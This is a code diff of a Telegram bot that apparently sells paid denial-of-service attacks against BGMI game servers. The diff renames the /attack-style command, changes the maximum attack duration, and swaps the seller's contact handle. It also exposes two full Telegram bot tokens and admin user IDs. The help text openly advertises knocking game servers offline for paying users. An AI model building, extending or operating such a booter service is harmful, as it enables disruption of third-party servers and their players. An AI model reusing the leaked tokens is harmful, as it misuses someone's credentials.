@@ -5,7 +5,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7909451173:AAGCVD3Utdku_fayZWe9SNB01XoxSsBwECU')
+bot = telebot.TeleBot('7784339491:AAFKRrGNcJrQ4z6N1449ok5_TJwrkJsOwjA')
 
 # Admin user IDs
 admin_id = {"7083378335", "1653595379"}
@@ -274,7 +274,7 @@ COOLDOWN_TIME =0
 attack_running = False
 
 # Handler for /attack command
-@bot.message_handler(commands=['jaat'])
+@bot.message_handler(commands=['chodo'])
 def handle_attack(message):
     global attack_running
 
@@ -291,12 +291,12 @@ def handle_attack(message):
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
 
-            if time > 300:
-                response = "Error: Time interval must be less than 300"
+            if time > 240:
+                response = "Error: Time interval must be less than 240"
             else:
                 attack_running = True  # Set the attack state to running
                 try:
-                    record_command_logs(user_id, '/jaat', target, port, time)
+                    record_command_logs(user_id, '/chodo', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
 
@@ -310,7 +310,7 @@ def handle_attack(message):
                 finally:
                     attack_running = False  # Reset the attack state
         else:
-            response = "Usage: /jaat <target> <port> <time>"
+            response = "Usage: /chodo <target> <port> <time>"
     else:
         response = "ACCESS TOH LELE FREE mai kuch nahi milega FREE mai shrif ghnta milega lega toh bata ."
 
@@ -343,7 +343,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''
-💥 /jaat : 😫BGMI WALO KE SERVER KO CHODO🥵. 
+💥 /chodo : 😫BGMI WALO KE SERVER KO CHODO🥵. 
 💥 /rules : 📒GWAR RULES PADHLE KAM AYEGA📒 !!.
 💥 /mylogs : 👁️SAB CHUDAI DEKHO👁️.
 💥 /plan : 💵SABKE BSS KA BAT HAI💵.
@@ -352,7 +352,7 @@ def show_help(message):
 👀 To See Admin Commands:
 🤖 /admincmd : Shows All Admin Commands.
 
-Buy From :- @uNreaIOwner
+Buy From :- @TREXVIVEK
 Official Channel :- na
 '''
     for handler in bot.message_handlers:
